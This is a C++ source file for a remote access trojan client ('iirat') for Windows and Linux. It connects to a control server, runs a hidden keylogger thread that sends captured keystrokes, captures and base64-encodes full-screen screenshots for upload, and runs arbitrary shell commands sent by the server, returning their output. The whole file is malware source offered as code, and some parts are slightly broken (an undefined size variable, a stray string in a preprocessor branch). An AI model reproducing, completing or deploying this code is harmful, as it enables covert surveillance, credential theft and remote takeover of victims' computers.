/*
* @Author: amaneureka
* @Date:   2017-04-02 03:33:49
* @Last Modified by:   amaneureka
* @Last Modified time: 2017-04-05 23:55:01
*/

#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pthread.h>
#include <fstream>
#include <sstream>

using namespace std;

#if __WIN__

    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 */

    /* supporting win 7 or later only */
    #define WINVER _WIN32_WINNT_WIN7
    #define _WIN32_WINNT _WIN32_WINNT_WIN7

    #include <windows.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>

    /* simple POSIX to windows translation */
    #define sleep Sleep
    #define read(soc, buf, len) recv(soc, buf, len, 0)
    #define write(soc, buf, len) send(soc, buf, len, 0)

#elif __LINUX__

    /* g++ -std=c++11 iirat.cpp -D__LINUX__ */

    #include <unistd.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <netinet/in.h>

#else

    "You forget to define platform"

#endif

static bool logged_in = false;

/* concerned special keycodes */
char keycodes[] =
{
    VK_LBUTTON,
    VK_RBUTTON,
    VK_MBUTTON,
    VK_BACK,
    VK_TAB,
    VK_RETURN,
    VK_SHIFT,
    VK_CONTROL,
    VK_MENU,
    VK_CAPITAL,
    VK_ESCAPE,
    VK_SPACE,
    VK_PRIOR,
    VK_PRIOR,
    VK_HOME,
    VK_LEFT,
    VK_UP,
    VK_RIGHT,
    VK_DOWN,
    VK_SNAPSHOT,
    VK_INSERT,
    VK_DELETE,

    VK_NUMPAD0,
    VK_NUMPAD1,
    VK_NUMPAD2,
    VK_NUMPAD3,
    VK_NUMPAD4,
    VK_NUMPAD5,
    VK_NUMPAD6,
    VK_NUMPAD7,
    VK_NUMPAD8,
    VK_NUMPAD9,

    VK_MULTIPLY,
    VK_ADD,
    VK_SEPARATOR,
    VK_SUBTRACT,
    VK_DECIMAL,
    VK_DIVIDE
};

void *logger(void *args)
{
    int i, index = 3;
    int sock = *(int*)args;

    char buffer[100] = "SAV";
    while(true)
    {
        // maximum of 3 entries can be made in a single loop so 1020
        if (index >= 90)
        {
            /* wait until we are logged in */
            while(!logged_in) sleep(100);

            /* send data */
            write(sock, buffer, index);

            /* reset buffer */
            index = 3;
        }

        for (int i = 0; i < sizeof(keycodes); i++)
        {
            /* get special key's status */
            if (GetAsyncKeyState(keycodes[i]))
                buffer[index++] = i;
        }

        for (int i = 0x41; i < 0x5B; i++)
        {
            /* get alphabets */
            if (GetAsyncKeyState(i))
                buffer[index++] = i;
        }

        for (int i = 0x30; i < 0x3A; i++)
        {
            /* get numeric keys */
            if (GetAsyncKeyState(i))
                buffer[index++] = i;
        }

        sleep(100);
    }
}

void register_device(int socket, string recv_uid)
{
    ifstream infile;
    ofstream outfile;
    char filename[] = ".socket";

    if (recv_uid.size())
    {
        remove(filename);
        outfile.open(filename);
        outfile << recv_uid;
        outfile.close();
    }

    infile.open(filename);

    if (!infile)
    {
        write(socket, "REG", 4);
        return;
    }

    string uid;
    infile >> uid;
    infile.close();

    uid = "LOG" + uid;
    write(socket, uid.c_str(), uid.size());
}

void execute_cmd(int socket, const string cmd)
{
    FILE *pPipe;
    char buffer[128] = "RSP-1";

    fflush(stdin);
    pPipe = popen(cmd.c_str(), "r");
    if (pPipe == NULL)
    {
        write(socket, buffer, 5);
        return;
    }

    string str;
    while(fgets(buffer + 3, 125, pPipe))
    {
        str = buffer;
        write(socket, str.c_str(), str.size());
    }

    pclose(pPipe);
    return;
}

const char BASE64_CODE[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
void convert_and_send(int socket, void *mem, int size)
{
    int index = 3;
    char buffer[500] = "RSP";
    BYTE* data = (BYTE*)mem;
    for (int i = 0; i < size; i += 3)
    {
        if (index >= 450)
        {
            write(socket, buffer, index);
            index = 3;
        }

        int d = data[i];
        buffer[index++] = BASE64_CODE[d >> 2];
        d = (d & 0x3) << 4;
        if (i + 1 < size)
        {
            d |= data[i + 1] >> 4;
            buffer[index++] = BASE64_CODE[d];

            d = (data[i + 1] & 0xF) << 2;
            if (i + 2 < size)
            {
                d |= data[i + 2] >> 6;
                buffer[index++] = BASE64_CODE[d];
                buffer[index++] = BASE64_CODE[data[i + 2] & 0x3F];
            }
            else
            {
                buffer[index++] = BASE64_CODE[d];
                buffer[index++] = '=';
            }
        }
        else
        {
            buffer[index++] = BASE64_CODE[d];
            buffer[index++] = '=';
        }
    }

    if (index > 3)
        write(socket, buffer, index);
}

void GetScreenShot(int socket)
{
    BYTE* memory;
    string str, tmp;
    BITMAPINFO info;
    HGDIOBJ old_obj;
    HBITMAP hBitmap;
    HDC hScreen, hDC;
    int width, height, bytes;
    BITMAPINFOHEADER infoHeader;

    /* get screen dimensions */
    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    /* info header */
    infoHeader.biSize          = sizeof(infoHeader);
    infoHeader.biWidth         = width;
    infoHeader.biHeight        = height;
    infoHeader.biPlanes        = 1;
    infoHeader.biBitCount      = 24;
    infoHeader.biCompression   = BI_RGB;
    infoHeader.biSizeImage     = 0;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed       = 0;
    infoHeader.biClrImportant  = 0;

    info.bmiHeader = infoHeader;

    /* copy screen to bitmap */
    hScreen = GetDC(NULL);
    hDC     = CreateCompatibleDC(hScreen);
    //hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    hBitmap = CreateDIBSection(hScreen, &info, DIB_RGB_COLORS, (void**)&memory, 0, 0);
    old_obj = SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

    bytes = (((24*width + 31) & (~31))/8)*height;
    convert_and_send(socket, memory, size);

    /* clean up */
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
}

int main(int argc, char *argv[])
{
    int sock;
    string cmd, req;
    vector<char> buffer(4096);
    struct sockaddr_in addr;
    fd_set active_fd_set, read_fd_set;

    pthread_t logger_thread;

    /* create socket */
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock < 0)
    {
        printf("could not create socket\n");
        exit(0);
    }

    /* configurations */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9009);

    if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0)
    {
        printf("address resolve failed\n");
        exit(0);
    }

    /* try to connect */
    if (connect(sock, (struct sockaddr *)&addr , sizeof(addr)) < 0)
    {
        printf("Unable to connect\n");
        exit(0);
    }

    printf("Server Connected :)\n");

    /* add client and stdin to read list */
    FD_ZERO(&active_fd_set);
    FD_SET(sock, &active_fd_set);
    //FD_SET(0, &active_fd_set);

    /* start background tasks */
    pthread_create(&logger_thread, NULL, &logger, &sock);

    while(true)
    {
        read_fd_set = active_fd_set;

        if (select(FD_SETSIZE, &read_fd_set, NULL, NULL, NULL) < 0)
        {
            printf("select error\n");
            exit(0);
        }

        for (int i = 0; i < FD_SETSIZE; i++)
        {
            if (FD_ISSET(i, &read_fd_set))
            {
                if (i == sock)
                {
                    if (read(sock, buffer.data(), buffer.size()) <= 0)
                    {
                        printf("\ndisconnected from the server\n");
                        exit(0);
                    }

                    cmd = buffer.data();
                    req = cmd.substr(0, 3);

                    if (req == "UID")
                    {
                        printf("[UID] key=\'%s\'\n", cmd.substr(3).c_str());

                        /* change current state */
                        logged_in = false;

                        /* save new uid and login again */
                        register_device(sock, cmd.substr(3));
                    }
                    else if (req == "HLO")
                    {
                        printf("[HLO] Hello!\n");

                        /* login successful */
                        logged_in = true;
                    }
                    else if (req == "INV")
                    {
                        printf("[INV] Invalid\n");

                        remove(".socket");

                        /* invalid command */
                        logged_in = false;

                        /* try to login again */
                        register_device(sock, "");
                    }
                    else if (req == "IDY")
                    {
                        printf("[IDY] Identify\n");

                        /* session flushed */
                        logged_in = false;

                        /* try to login again */
                        register_device(sock, "");
                    }
                    else if (req == "CMD")
                    {
                        printf("[CMD] \'%s\'\n", req.c_str());

                        req = cmd.substr(3, 4);

                        if (req == "SSCR")
                            /* get screenshot */
                            GetScreenShot(sock);

                        else if (req == "EXEC")
                            /* command to execute */
                            execute_cmd(sock, cmd.substr(7));
                    }
                }
            }
        }
    }

    return 0;
}
